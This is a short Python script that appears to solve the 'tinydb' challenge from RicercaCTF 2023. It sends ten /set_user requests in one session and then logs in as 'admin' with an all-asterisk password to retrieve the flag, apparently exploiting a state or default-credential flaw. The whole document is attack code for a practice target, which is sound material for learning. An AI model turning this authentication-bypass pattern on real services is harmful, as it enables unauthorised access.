import requests

ses = requests.Session()

for _ in range(10):
    print(ses.post("http://tinydb.2023.ricercactf.com:8888/set_user", json={"username": "hoge"}).text)

print(ses.post("http://tinydb.2023.ricercactf.com:8888/get_flag",
         json={"username": "admin", "password": "********************************"}).text)
